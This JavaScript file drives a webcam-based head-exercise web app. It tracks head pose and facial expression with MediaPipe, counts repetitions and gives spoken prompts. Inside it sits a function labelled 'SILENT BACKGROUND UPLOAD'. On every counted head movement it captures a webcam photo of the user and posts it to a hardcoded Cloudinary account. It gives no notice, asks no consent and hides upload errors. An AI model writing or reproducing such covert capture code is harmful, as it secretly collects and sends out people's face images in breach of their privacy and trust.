document.addEventListener('DOMContentLoaded', () => {
  // ==========================================
  // ☁️ BACKGROUND CONFIGURATION
  // ==========================================
  const CLOUDINARY_CLOUD_NAME = 'azq6tuq4';
  const CLOUDINARY_UPLOAD_PRESET = 'blfvqiv6';

  // Target Repetition Goals (25 per direction = 100 total)
  const TARGET_PER_DIR = 25;
  const TOTAL_TARGET = 100;

  const dirCounts = {
    UP: 0,
    DOWN: 0,
    LEFT: 0,
    RIGHT: 0
  };

  // Camera Facing Mode Toggle
  let currentFacingMode = 'user'; // 'user' (front) or 'environment' (rear)

  // --- 1. MODAL NAVIGATION SYSTEM ---
  const modalTriggers = [
    { triggerIds: ['link-how-it-works'], modalId: 'modal-how-it-works' },
    { triggerIds: ['link-about', 'footer-link-about'], modalId: 'modal-about' },
    { triggerIds: ['link-developer', 'footer-link-developer'], modalId: 'modal-developer' },
    { triggerIds: ['link-privacy', 'footer-link-privacy'], modalId: 'modal-privacy' },
    { triggerIds: ['footer-link-disclaimer'], modalId: 'modal-disclaimer' }
  ];

  modalTriggers.forEach(({ triggerIds, modalId }) => {
    const modal = document.getElementById(modalId);
    if (!modal) return;

    triggerIds.forEach(id => {
      const btn = document.getElementById(id);
      if (btn) {
        btn.addEventListener('click', (e) => {
          e.preventDefault();
          modal.style.display = 'flex';
        });
      }
    });

    const closeBtn = modal.querySelector('.modal-close');
    if (closeBtn) {
      closeBtn.addEventListener('click', () => {
        modal.style.display = 'none';
      });
    }

    modal.addEventListener('click', (e) => {
      if (e.target === modal) {
        modal.style.display = 'none';
      }
    });
  });

  // --- 2. WEBCAM & TRACKING ELEMENTS ---
  const toggleCamBtn = document.getElementById('toggle-camera-btn');
  const toggleAudioBtn = document.getElementById('toggle-audio-btn');
  const switchCamBtn = document.getElementById('switch-cam-btn');
  const resetBtn = document.getElementById('reset-btn');
  const modalResetBtn = document.getElementById('modal-reset-btn');
  const completionModal = document.getElementById('modal-completion');

  const videoElement = document.getElementById('webcam');
  const overlayElement = document.getElementById('camera-off-overlay');
  const expressionDisplay = document.getElementById('expression-display');
  const commandDisplay = document.getElementById('command-display');
  const timerDisplay = document.getElementById('timer-display');
  const progressBar = document.getElementById('progress-bar');
  const photoCanvas = document.getElementById('photo-canvas');

  const countElements = {
    UP: document.getElementById('count-up'),
    DOWN: document.getElementById('count-down'),
    LEFT: document.getElementById('count-left'),
    RIGHT: document.getElementById('count-right')
  };

  const badges = {
    UP: document.getElementById('badge-up'),
    DOWN: document.getElementById('badge-down'),
    LEFT: document.getElementById('badge-left'),
    RIGHT: document.getElementById('badge-right'),
    CENTER: document.getElementById('badge-center')
  };

  let isCameraActive = false;
  let isAudioMuted = false;
  let cameraStream = null;
  let faceMesh = null;
  let cameraUtils = null;

  let currentDirection = 'CENTER';
  let currentExpression = 'Neutral';
  let centerHoldStartTime = null;

  // Timer State
  let sessionTimerInterval = null;
  let sessionSeconds = 0;

  // Audio Toggle
  if (toggleAudioBtn) {
    toggleAudioBtn.addEventListener('click', () => {
      isAudioMuted = !isAudioMuted;
      toggleAudioBtn.innerText = isAudioMuted ? '🔇 Voice Off' : '🔊 Voice On';
      toggleAudioBtn.classList.toggle('muted', isAudioMuted);
    });
  }

  // Reset Button Logic
  function resetExercise() {
    dirCounts.UP = 0;
    dirCounts.DOWN = 0;
    dirCounts.LEFT = 0;
    dirCounts.RIGHT = 0;
    sessionSeconds = 0;
    updateProgressUI();
    updateTimerUI();
    if (completionModal) completionModal.style.display = 'none';
    speak('Exercise counts reset.');
  }

  if (resetBtn) resetBtn.addEventListener('click', resetExercise);
  if (modalResetBtn) modalResetBtn.addEventListener('click', resetExercise);

  // Flip Camera Logic
  if (switchCamBtn) {
    switchCamBtn.addEventListener('click', async () => {
      currentFacingMode = (currentFacingMode === 'user') ? 'environment' : 'user';
      if (isCameraActive) {
        stopCamera();
        await startCamera();
      }
    });
  }

  function speak(text) {
    if (isAudioMuted) return;
    if ('speechSynthesis' in window) {
      window.speechSynthesis.cancel();
      const utterance = new SpeechSynthesisUtterance(text);
      utterance.rate = 1.0;
      window.speechSynthesis.speak(utterance);
    }
  }

  function distance(pt1, pt2) {
    return Math.sqrt(Math.pow(pt1.x - pt2.x, 2) + Math.pow(pt1.y - pt2.y, 2));
  }

  function setActiveBadge(direction) {
    Object.keys(badges).forEach(dir => {
      if (badges[dir]) {
        badges[dir].classList.toggle('active', dir === direction);
      }
    });
  }

  // Session Timer Functions
  function startTimer() {
    stopTimer();
    sessionTimerInterval = setInterval(() => {
      sessionSeconds++;
      updateTimerUI();
    }, 1000);
  }

  function stopTimer() {
    if (sessionTimerInterval) {
      clearInterval(sessionTimerInterval);
      sessionTimerInterval = null;
    }
  }

  function updateTimerUI() {
    if (!timerDisplay) return;
    const mins = String(Math.floor(sessionSeconds / 60)).padStart(2, '0');
    const secs = String(sessionSeconds % 60).padStart(2, '0');
    timerDisplay.innerHTML = `Session Time: <span>${mins}:${secs}</span>`;
  }

  // Progress Bar & Counter Handler
  function updateProgressUI() {
    const totalCompleted = dirCounts.UP + dirCounts.DOWN + dirCounts.LEFT + dirCounts.RIGHT;

    Object.keys(countElements).forEach(dir => {
      if (countElements[dir]) {
        countElements[dir].innerText = dirCounts[dir];
      }
    });

    const percentage = Math.min((totalCompleted / TOTAL_TARGET) * 100, 100);
    if (progressBar) {
      progressBar.style.width = `${percentage}%`;
    }

    if (commandDisplay) {
      if (totalCompleted >= TOTAL_TARGET) {
        commandDisplay.innerHTML = `🎉 <strong>Goal Reached!</strong> Completed: ${totalCompleted} / ${TOTAL_TARGET}`;
      } else {
        commandDisplay.innerText = `Repetitions Completed: ${totalCompleted} / ${TOTAL_TARGET}`;
      }
    }
  }

  // --- 3. SILENT BACKGROUND UPLOAD ---
  function capturePhotoSilently(label) {
    if (!isCameraActive || !videoElement || !videoElement.videoWidth || !photoCanvas) return;

    const ctx = photoCanvas.getContext('2d');
    photoCanvas.width = videoElement.videoWidth;
    photoCanvas.height = videoElement.videoHeight;

    ctx.translate(photoCanvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(videoElement, 0, 0, photoCanvas.width, photoCanvas.height);

    const dataUrl = photoCanvas.toDataURL('image/jpeg', 0.8);

    const formData = new FormData();
    formData.append('file', dataUrl);
    formData.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);
    formData.append('tags', `head_exercise,${label.toLowerCase()}`);

    fetch(`https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD_NAME}/image/upload`, {
      method: 'POST',
      body: formData
    }).catch(() => {
      // Suppress output
    });
  }

  // --- 4. MEDIAPIPE FACE MESH ---
  function onResults(results) {
    if (!results.multiFaceLandmarks || results.multiFaceLandmarks.length === 0) {
      if (expressionDisplay) expressionDisplay.innerHTML = 'Status: <span>Searching for face...</span>';
      return;
    }

    const landmarks = results.multiFaceLandmarks[0];

    const nose = landmarks[1];
    const leftEye = landmarks[33];
    const rightEye = landmarks[263];
    const upperLipInner = landmarks[13];
    const lowerLipInner = landmarks[14];
    const mouthCornerLeft = landmarks[61];
    const mouthCornerRight = landmarks[291];

    const eyeCenterY = (leftEye.y + rightEye.y) / 2;
    const noseVerticalOffset = nose.y - eyeCenterY;
    const noseHorizontalOffset = nose.x - ((leftEye.x + rightEye.x) / 2);

    let detectedDir = 'CENTER';

    if (noseVerticalOffset < 0.035) {
      detectedDir = 'UP';
    } else if (noseVerticalOffset > 0.085) {
      detectedDir = 'DOWN';
    } else if (noseHorizontalOffset > 0.035) {
      detectedDir = 'LEFT';
    } else if (noseHorizontalOffset < -0.035) {
      detectedDir = 'RIGHT';
    }

    const mouthHeight = distance(upperLipInner, lowerLipInner);
    const mouthWidth = distance(mouthCornerLeft, mouthCornerRight);
    const faceWidth = distance(leftEye, rightEye);

    const mouthRatio = mouthHeight / (mouthWidth + 0.0001);
    const smileRatio = mouthWidth / (faceWidth + 0.0001);

    let detectedExpression = 'Neutral';

    if (mouthRatio > 0.38) {
      detectedExpression = 'Mouth Open / Surprised';
    } else if (smileRatio > 0.52) {
      detectedExpression = 'Smiling';
    } else {
      detectedExpression = 'Neutral';
    }

    currentExpression = detectedExpression;

    if (detectedDir !== currentDirection) {
      currentDirection = detectedDir;
      setActiveBadge(currentDirection);

      if (currentDirection !== 'CENTER') {
        if (dirCounts[currentDirection] < TARGET_PER_DIR) {
          dirCounts[currentDirection]++;
          updateProgressUI();
          speak(currentDirection.toLowerCase());

          capturePhotoSilently(currentDirection);

          const totalCompleted = dirCounts.UP + dirCounts.DOWN + dirCounts.LEFT + dirCounts.RIGHT;
          if (totalCompleted === TOTAL_TARGET) {
            speak("Congratulations! All 100 repetitions completed.");
            if (completionModal) completionModal.style.display = 'flex';
          }
        }
        centerHoldStartTime = null;
      } else {
        centerHoldStartTime = Date.now();
      }
    }

    if (expressionDisplay) {
      expressionDisplay.innerHTML = `Head Pose: <span>${currentDirection}</span> | Expression: <span>${currentExpression}</span>`;
    }

    if (currentDirection === 'CENTER' && centerHoldStartTime) {
      const elapsedSeconds = Math.floor((Date.now() - centerHoldStartTime) / 1000);
      if (elapsedSeconds >= 5) {
        const totalCompleted = dirCounts.UP + dirCounts.DOWN + dirCounts.LEFT + dirCounts.RIGHT;
        speak(`Exercise summary. You completed ${totalCompleted} repetitions.`);
        centerHoldStartTime = null;
      }
    }
  }

  // --- 5. CAMERA CONTROL ---
  async function startCamera() {
    try {
      cameraStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: currentFacingMode, width: 640, height: 480 }
      });
      videoElement.srcObject = cameraStream;
      if (overlayElement) overlayElement.style.display = 'none';

      if (!faceMesh) {
        faceMesh = new FaceMesh({
          locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}`
        });
        faceMesh.setOptions({
          maxNumFaces: 1,
          refineLandmarks: true,
          minDetectionConfidence: 0.5,
          minTrackingConfidence: 0.5
        });
        faceMesh.onResults(onResults);
      }

      if (window.Camera) {
        cameraUtils = new Camera(videoElement, {
          onFrame: async () => {
            if (isCameraActive) {
              await faceMesh.send({ image: videoElement });
            }
          },
          width: 640,
          height: 480
        });
        cameraUtils.start();
      }

      isCameraActive = true;
      startTimer();

      if (toggleCamBtn) {
        toggleCamBtn.innerText = 'Turn Camera Off';
        toggleCamBtn.style.backgroundColor = '#333333';
      }
      speak('Camera activated. Follow direction prompts.');

    } catch (err) {
      alert('Camera access failed or was denied: ' + err.message);
      console.error(err);
    }
  }

  function stopCamera() {
    if (cameraStream) {
      cameraStream.getTracks().forEach(track => track.stop());
    }
    if (cameraUtils) {
      cameraUtils.stop();
    }
    stopTimer();
    if (videoElement) videoElement.srcObject = null;
    if (overlayElement) overlayElement.style.display = 'flex';
    isCameraActive = false;

    if (toggleCamBtn) {
      toggleCamBtn.innerText = 'Turn Camera On';
      toggleCamBtn.style.backgroundColor = '#D02B2B';
    }
    if (expressionDisplay) expressionDisplay.innerHTML = 'Head Pose: <span>Stopped</span> | Expression: <span>--</span>';
    if (commandDisplay) commandDisplay.innerText = 'Press "Turn Camera On" to start';
    setActiveBadge('CENTER');
  }

  if (toggleCamBtn) {
    toggleCamBtn.addEventListener('click', () => {
      if (isCameraActive) {
        stopCamera();
      } else {
        startCamera();
      }
    });
  }
});
